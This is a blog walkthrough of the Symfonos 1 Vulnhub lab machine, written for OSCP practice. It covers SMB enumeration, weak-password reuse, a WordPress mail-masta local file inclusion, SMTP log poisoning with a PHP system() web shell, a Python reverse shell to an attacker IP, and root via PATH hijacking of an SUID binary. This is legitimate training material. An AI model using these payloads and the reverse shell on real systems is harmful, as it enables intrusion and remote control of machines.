---
layout: default
title : muzec - Symfonos 1 Vulnhub Writeup
---

![image](https://user-images.githubusercontent.com/69868171/156543520-023bebc1-3233-401c-9710-f2d6f66e0675.png)

Preparing for the OSCP examination so am going after OSCP like machines to improve on my enumeration skills and exploitation don't want to miss anything on the day of the exam XD feel free to jump in [Download Symfonos 1 Here](https://www.vulnhub.com/entry/symfonos-1,322/) .

We always start with an nmap scan.....

```
nmap -p- --min-rate 10000 -oA nmap/allports -v IP
```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos1]
└─$ nmap -p- --min-rate 10000 -oN nmap/allports 172.16.109.132 -v  
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-03 08:26 WAT
Initiating Ping Scan at 08:26
Scanning 172.16.109.132 [2 ports]
Completed Ping Scan at 08:26, 0.00s elapsed (1 total hosts)
Initiating Connect Scan at 08:26
Scanning symfonos.local (172.16.109.132) [65535 ports]
Discovered open port 445/tcp on 172.16.109.132
Discovered open port 80/tcp on 172.16.109.132
Discovered open port 22/tcp on 172.16.109.132
Discovered open port 139/tcp on 172.16.109.132
Discovered open port 25/tcp on 172.16.109.132
Completed Connect Scan at 08:26, 2.14s elapsed (65535 total ports)
Nmap scan report for symfonos.local (172.16.109.132)
Host is up (0.0057s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.33 seconds
```

let know what we are dealing with by using the default nmap scripts and service detection switch.

```
nmap -sC -sV -oN nmap/normal.tcp -p- 172.16.109.132
```
 
```
# Nmap 7.91 scan initiated Wed Mar  2 18:22:37 2022 as: nmap -sC -sV -oN nmap/normal.tcp -p- 172.16.109.132
Nmap scan report for symfonos.local (172.16.109.132)
Host is up (0.0021s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m51s, median: -1s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2022-03-02T11:22:52-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-03-02T17:22:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar  2 18:23:10 2022 -- 1 IP address (1 host up) scanned in 32.21 seconds
```

Now that is more better we some interesting ports to look into but let start with the enumeration of SMB since it the low hanging fruit now let see what we can loot on it.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos1]
└─$ smbclient -L //172.16.109.132/ -N          

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available
```
Now seems we have anonymous share which we can be access with no credentilas let try it.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos1]
└─$ smbclient  //172.16.109.132/anonymous -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 29 02:14:49 2019
  ..                                  D        0  Sat Jun 29 02:12:15 2019
  attention.txt                       N      154  Sat Jun 29 02:14:49 2019

                19994224 blocks of size 1024. 17040344 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 154 as attention.txt (5.0 KiloBytes/sec) (average 5.0 KiloBytes/sec)
smb: \> 
```

Seems we got a txt file let download it to our attacking machine. And see what we have.

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos1]
└─$ cat attention.txt  

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```

Now that is interesting if i remember clearly we still have a share owned by `helios` let try using the password we got now to see if user `helios` also fall victim of using weak password.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos1]
└─$ smbclient -L //172.16.109.132/ -U helios
Enter WORKGROUP\helios's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos1]
└─$ smbclient -L //172.16.109.132/helios -U helios
Enter WORKGROUP\helios's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos1]
└─$ smbclient  //172.16.109.132/helios -U helios 
Enter WORKGROUP\helios's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 29 01:32:05 2019
  ..                                  D        0  Wed Mar  2 19:52:03 2022
  research.txt                        A      432  Sat Jun 29 01:32:05 2019
  todo.txt                            A       52  Sat Jun 29 01:32:05 2019

                19994224 blocks of size 1024. 17040344 blocks available
smb: \> 
```

Boom we hit the bull eye `helios` password is `qwerty` now let get the files.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos1]
└─$ cat research.txt todo.txt
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.

1. Binge watch Dexter
2. Dance
3. Work on /h3l105

```

Now i `cat` both files and seems we found a hidden directory let try accessing it.

![image](https://user-images.githubusercontent.com/69868171/156554843-ef0c9058-702f-444c-9f98-c9e555166207.png)

Now that is interesting seems we re dealing with wordpress we can easily use `wpscan` to enumerate it more .

```
wpscan --url http://symfonos.local/h3l105/ --plugins-detection passive
```

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.15
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[32m[+][0m URL: http://symfonos.local/h3l105/ [172.16.109.132]
[32m[+][0m Started: Thu Mar  3 09:31:04 2022

Interesting Finding(s):

[32m[+][0m Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[32m[+][0m XML-RPC seems to be enabled: http://symfonos.local/h3l105/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[32m[+][0m WordPress readme found: http://symfonos.local/h3l105/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m Upload directory has listing enabled: http://symfonos.local/h3l105/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m The external WP-Cron seems to be enabled: http://symfonos.local/h3l105/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[32m[+][0m WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://symfonos.local/h3l105/index.php/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>
 |  - http://symfonos.local/h3l105/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>

[32m[+][0m WordPress theme in use: twentynineteen
 | Location: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/readme.txt
 | [33m[!][0m The version is out of date, the latest version is 2.2
 | Style URL: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: 'Version: 1.4'


[34m[i][0m Plugin(s) Identified:

[32m[+][0m mail-masta
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt

[32m[+][0m site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt


[34m[i][0m No Config Backups Found.

[33m[!][0m No WPScan API Token given, as a result vulnerability data has not been output.
[33m[!][0m You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[32m[+][0m Finished: Thu Mar  3 09:31:09 2022
[32m[+][0m Requests Done: 139
[32m[+][0m Cached Requests: 40
[32m[+][0m Data Sent: 37.118 KB
[32m[+][0m Data Received: 19.932 KB
[32m[+][0m Memory used: 225.758 MB
[32m[+][0m Elapsed time: 00:00:04
```

Now that is interesting look go through the plugins we just found.

![image](https://user-images.githubusercontent.com/69868171/156556885-c868fafe-979f-4e61-aee7-d9f4cd22935d.png)

Now that is some old plugins let do research on it if it vulnerable.

![image](https://user-images.githubusercontent.com/69868171/156559316-31261f83-64f1-4b79-9ee5-53d22e20f67b.png)

![image](https://user-images.githubusercontent.com/69868171/156559913-2c08c778-bb0e-49d0-aa9c-f44a15d1c3a8.png)

Boom seems both is vulnerable to LFI the first thing is first that come to my mind is to check for the `wp-config.php` . But was able to use the mail masta LFI to read the config file.

```
http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```

![image](https://user-images.githubusercontent.com/69868171/156565106-05891722-551c-48d9-a00d-e1b32e11f5f8.png)

![image](https://user-images.githubusercontent.com/69868171/156565678-776bfbf9-3c1e-452a-8d93-3e0df2fef0a5.png)

But seems after decoding it and getting the config.php file it not that useful back to our nmap scan to try something else apache log poisoning, SSH log poisoning no luck but we still have a port to try for log poisoning which is SMTP let give it a try.

![image](https://user-images.githubusercontent.com/69868171/156567326-6294bde3-b71e-435f-9cbf-8302bc5f6d18.png)

```
MAIL FROM:<Muzec@hacker.com>
RCPT TO:<?php system($_GET['cmd']); ?>
```

Note: We can ignore the 501 5.1.3 Bad recipient address syntax server response as seen in the above screenshot because ideally the internal email program of the server (victim machine), is expecting us to input an email ID and not the OS commands.

```
http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
```

Now we can see the logs.

![image](https://user-images.githubusercontent.com/69868171/156567980-17821be5-cd69-44b2-b6db-8633fe23ee49.png)

Now let try to execute a command.

```
http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=id
```

![image](https://user-images.githubusercontent.com/69868171/156568137-a02a6026-f64c-4d9e-a05f-2460f95b72df.png)

Now we have RCE let get a reverse shell back to our terminal using `python` .

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.109.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image](https://user-images.githubusercontent.com/69868171/156568519-230adccd-d180-41fb-bb4b-472e13143a53.png)

Now let spawn a full TTY shell.

```
python -c 'import pty; pty.spawn ("/bin/bash")'
Ctrl Z
stty raw -echo;fg
Enter
stty rows 21 cols 210
export TERM=xterm-256color
```

![image](https://user-images.githubusercontent.com/69868171/156569616-e157d3c2-2163-41d6-9fcd-c2f104b0bb54.png)

Ahhh checking `sudo -l` and seems we no `sudo` install now let check for SUID.

![image](https://user-images.githubusercontent.com/69868171/156569775-a7768775-c1d7-4fce-8718-c809ceeae6ea.png)

```
find / -perm -u=s -type f 2>/dev/null
```
Now that is a strange one `/opt/statuscheck` let run it and see what it does.

![image](https://user-images.githubusercontent.com/69868171/156570123-3944c44e-858f-4e14-998e-3f3f905c07e0.png)

Interesting let `strings` it.

![image](https://user-images.githubusercontent.com/69868171/156570468-0608f3a9-3e9d-4c7c-9262-146732269557.png)

Now seems it running `curl` and the full path is not specify it possible to hijack it which is the path variable we can create our own `curl` and add it to the path.

```
helios@symfonos:/tmp$ echo "/bin/sh" > curl
helios@symfonos:/tmp$ chmod 777 curl
helios@symfonos:/tmp$ export PATH=/tmp:$PATH
helios@symfonos:/tmp$ /opt/statuscheck
```

![image](https://user-images.githubusercontent.com/69868171/156572010-a2e198e8-ac6d-44ea-bd5c-6bdc4ed14287.png)

That it bro we are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>

